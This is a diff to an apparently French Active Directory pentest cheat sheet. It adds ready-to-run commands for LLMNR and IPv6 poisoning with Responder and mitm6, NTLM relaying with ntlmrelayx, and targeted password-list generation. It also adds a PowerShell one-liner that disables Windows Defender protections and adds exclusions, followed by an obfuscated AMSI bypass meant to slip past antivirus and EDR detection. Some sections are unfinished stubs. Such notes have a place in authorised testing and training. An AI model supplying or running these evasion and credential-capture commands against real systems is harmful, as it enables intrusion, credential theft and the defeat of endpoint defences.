@@ -411,12 +411,17 @@ sprayhound -d TSSR-CYBER.FR -dc 10.0.0.1 -lu a.leration -lp 'Tssrcyber1234' -p '
 # __INTERCEPT NTLMv1 - NTLMv2 HASHS__
 
 
-> Outils : Responder <br>
+> Outils : Responder, mitm6  <br>
 > ATT&CK Tactic : Adversary-in-the-Middle, Credential Access, Collection <br>
 > ATT&CK Sub-techniques : LLMNR/NBT-NS Poisoning <br>
 > ATT&CK Technique : T1557
 
 <br>
+
+### Responder
+
+Quand une machine Windows cherche une ressource (ex: \\SERVEUR ou http://intranet) et que le DNS ne répond pas ou n’est pas utilisé, elle diffuse une requête locale. Responder se fait alors passer pour la ressource demandée. <br>
+Si la machine tente de s’y connecter, elle envoie une authentification NTLM mais responder ne l'expoite pas directement, il capture le challenge/réponse NTLM permettant de d'intercepter le hash au passage.
 
 **LLMNR** (*Link-Local Multicast Name Resolution*) et **NBT-NS** (*NetBIOS Name Service*) sont des composants Microsoft Windows qui servent de méthodes alternatives d'identification d'hôte.
 
@@ -425,10 +430,10 @@ sprayhound -d TSSR-CYBER.FR -dc 10.0.0.1 -lu a.leration -lp 'Tssrcyber1234' -p '
 * Il vient se placer entre le client et le “serveur” inexistant (qu'il imite)
 * Il peut permettre de forcer une authentification NTLM puis récupère le hash de Kerberos
 
+
 <br>
 
 
-__Responder__
 
 Indiquer l'interface sur laquelle on souhaite écouter (celle de la machine d'attaque)
 ```sh
@@ -464,12 +469,81 @@ __Chemin des logs Responder :__
 /usr/share/responder/logs
 ```
 
+<br>
+
+### mitm6
+
+Mitm6 est un outil d’empoisonnement IPv6, principalement conçu pour les réseaux Active Directory mal configurés en envoyant de faux messages comme 'Router Advertissement' (*RA*) ou en répondant au DNS IPv6 (et parfois DHCPv6). Les postes acceptent ces annonces permmetant d'utiliser l'attaquant comme DNS IPv6, en cherchant un proxy (*WPAD*) ou en s'authentifiant via NTLM vers des services controlés par l'attaquant.
+
+Il sert principalment à provoquer des authentifications NTLM qui sont ensuite capturées par Responder ou relayées par ntlmrelayx, cependant mitm6 capture aussi beaucoup de comptes mahines difficilements exploitables. (+ 120 caractères)
+
+Installer mitm6 (python3 requis)
+```sh
+sudo apt install mitm6
+```
+
+Lancer mitm6 puis lancer Responder
+```sh
+sudo mitm6 -d <domain.name>
+sudo responder -I eth0 
+```
+
+mitm6 agit en amont : il force les machines à parler, là où Responder attend qu’elles parlent.
+
 
 
 
 ---
 
 <br>
+
+
+
+
+# __NTLM RELAY__
+
+
+> ATT&CK Tactic : <br>
+> ATT&CK Technique ID : <br>
+> Outils : ntlmrelayx
+
+Une authentification NTLM arrive puis elle est rejouée immédiatement vers une autre cible. <br>
+Cet outil exploite l’absence de protections (SMB signing, LDAP signing, EPA…) et fonctionne bien avec mitm6.
+
+```sh
+ntlmrelayx.py -t ldap://dc.domaine.local
+```
+
+
+INC.
+
+
+---
+
+<br>
+
+
+
+
+# __KERBEROS RELAY__
+
+> ATT&CK Tactic : Lateral Movement / Privilege Escalation <br>
+> ATT&CK Technique ID : T1557 – Adversary-in-the-Middle <br>
+> Outils : krbrelayx.py
+
+<br>
+
+
+INC.
+
+
+
+
+
+---
+
+<br>
+
 
 
 
@@ -586,7 +660,7 @@ Evilwinrm permet aussi de se connecter avec un hash NTLM (Pass-the-Hash) et de c
 
 
 
-# __CREATING A PASSWORD LIST__
+# __CREATE A PASSWORD LIST__
 
 
 > Outils : crunch, sed, heredoc (EOF), printf, boucles for <br>
@@ -594,7 +668,9 @@ Evilwinrm permet aussi de se connecter avec un hash NTLM (Pass-the-Hash) et de c
 
 <br>
 
-crunch est pratique pour créer des variations d'un même mot
+## crunch 
+
+Ce programme est installé par défaut, pratique pour créer des variations d'un même mot
 ```sh
 crunch 9 9 -t toto\*%%%% -o tototest.txt
 ```
@@ -715,6 +791,20 @@ Lille@
 Lille$
 ...
 ```
+
+Rajouter des chiffres dans la liste créée
+```sh
+while read -r w; do for i in {0..9999}; do printf "%s%d\n" "$w" "$i"; done; done < Nord.txt >> Nord_num.txt
+```
+
+* lit chaque mot de tmpnord.txt
+* ajoute 0 → 9999 sans padding
+* n’écrase pas la liste existante
+* écrit dans tmpnord_num.txt
+
+ %d = pas de zéro à gauche (%4d n’est qu’une largeur, pas une plage).
+
+
 <br>
 
 | Motif | Signification |
@@ -733,7 +823,7 @@ Lille$
 
 <br>
 
-Avec toutes ces possiblités, il est possible de créer facilement de longues listes de mots de passe ciblées par rapports au contexte souhaité (nom d'entreprise, locations,etc...). Rajouter un fichier de règle de nombres serait pertinent dans ce contexte.
+Avec toutes ces possiblités, il est possible de créer facilement de très longues listes de mots de passe ciblées en rapport au contexte souhaité (nom d'entreprise, locations,etc...). Rajouter un fichier de règle de nombres serait pertinent dans ce contexte.
 
 
 
@@ -764,14 +854,21 @@ En résumé, AMSI sert d'intermédiaire entre une application et un moteur antiv
 
 <br>
 
+> [!IMPORTANT]
+> L’obfuscation permet de contourner la détection de certaines règles Anti-Virus ou EDR, mais ne permettra pas d'effectuer une commande pour laquelle vous n'avez pas les privilèges requis pour celle-ci.
+
+<br>
+
 ### Désactiver Defender, exclusion de "C:\Windows\Temp", exclut les extension .exe et .ps1 
 ```powershell		
 Set-MpPreference -DisableRealtimeMonitoring $true -DisableBehaviorMonitoring $true -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableScriptScanning $true -DisablePrivacyMode $true -DisableBlockAtFirstSeen $true -ExclusionExtension "ps1", "exe";Add-MpPreference -ExclusionPath "C:\Windows\Temp"
 ```
 
 
+Si vous ne pouvez pas désactiver Defender ou effectuer une exclusion (extension ou chemin) vous n'avaz peut être pas les droits, mais il arrive que certaines commandes soient flaguées comme malveillantes et dans certains cas il est possible d'effectuer un bypass AMSI.
 
-Si vous ne pouvez pas désactiver Defender, voici l'équivalent de la commande précédente mais obfusquée pour tenter un bypass AMSI :
+
+### Obfuscation de la commande précédente :
 ```powershell
 #Matt Graebers Reflection method 
 $bncYsK0MlQXwYafCQC=$null;$fR_nvfL="System.$(('Mänä'+'gémè'+'nt').noRMALiZe([cHAR](70)+[ChAr](111+101-101)+[chaR]([byTe]0x72)+[chaR]([bYtE]0x6d)+[Char]([ByTe]0x44)) -replace [CHaR]([BytE]0x5c)+[cHAR]([BYTE]0x70)+[char]([Byte]0x7b)+[CHaR]([BYtE]0x4d)+[cHAR]([byTe]0x6e)+[chaR](125)).$(('Á'+'û'+'t'+'ô'+'m'+'ä'+'t'+'ì'+'ô'+'n').NORmAlIze([cHaR]([Byte]0x46)+[Char](111)+[CHAR]([BYtE]0x72)+[cHaR](109)+[cHAr]([BytE]0x44)) -replace [ChAr](92*4/4)+[cHar](112*19/19)+[CHAr]([bYtE]0x7b)+[cHaR]([bYtE]0x4d)+[CHaR](110+34-34)+[chAR](125)).$([cHAR](65)+[CHaR]([bYTE]0x6d)+[cHaR]([BYTe]0x73)+[CHar](31+74)+[cHaR]([ByTE]0x55)+[chAR]([BYte]0x74)+[chaR](105)+[char](108*9/9)+[CHAR]([ByTe]0x73))";$vjzpibzqpxemahbiucfml="+[cHaR]([bYtE]0x70)+[ChAr]([ByTE]0x68)+[cHar](115*94/94)+[chAr](110*97/97)+[char]([ByTe]0x64)+[cHaR](79+21)+[CHar]([BYTE]0x67)+[CHAr]([bYte]0x7a)+[Char]([Byte]0x68)+[char](46+52)+[CHaR]([BYTE]0x7a)+[ChAr]([BYTE]0x64)+[cHAR](98)+[char]([bYTe]0x6e)+[CHaR](20+87)+[chaR](66+55)+[ChAR]([bYte]0x62)+[chaR]([ByTe]0x73)+[cHAR](118*110/110)+[ChAR](102*56/56)+[Char]([ByTe]0x77)+[cHar](112)";[Threading.Thread]::Sleep(127);[Ref].Assembly.GetType($fR_nvfL).GetField($([cHaR]([Byte]0x61)+[cHAr]([bYTe]0x6d)+[CHAR]([BYte]0x73)+[ChaR](105*91/91)+[CHAR](73+67-67)+[chAR]([BYTe]0x6e)+[CHaR]([BYtE]0x69)+[char]([ByTE]0x74)+[ChAr]([bYte]0x46)+[cHAR]([BytE]0x61)+[CHaR](105*29/29)+[cHaR](108+72-72)+[CHAR]([BYTe]0x65)+[cHAr](100)),"NonPublic,Static").SetValue($bncYsK0MlQXwYafCQC,$true);$ccynxqvpluwhsqrp="+('óx'+'xb'+'âg'+'zy'+'mw'+'zs'+'ín'+'ún'+'rh'+'ûw'+'pf'+'pr'+'qs'+'gd'+'n').normaLIZE([cHAr](4+66)+[cHar]([byTe]0x6f)+[CHaR](114)+[cHAr]([bYtE]0x6d)+[CHar]([Byte]0x44)) -replace [CHar]([BYtE]0x5c)+[CHAR](112*80/80)+[CHAr](65+58)+[cHAR](77+74-74)+[CHaR]([byTe]0x6e)+[ChAr](125)";[Threading.Thread]::Sleep(490)
@@ -1018,24 +1115,6 @@ gc c:\windows\system32\mimilsa.log
 
 
 
-
----
-
-<br>
-
-
-
-
-# __KERBEROS RELAY__
-
-> ATT&CK Tactic : Lateral Movement / Privilege Escalation <br>
-> ATT&CK Technique ID : T1557 – Adversary-in-the-Middle
-> Outils : krbrelayx.py
-
-<br>
-
-
-INC.
 
 
 
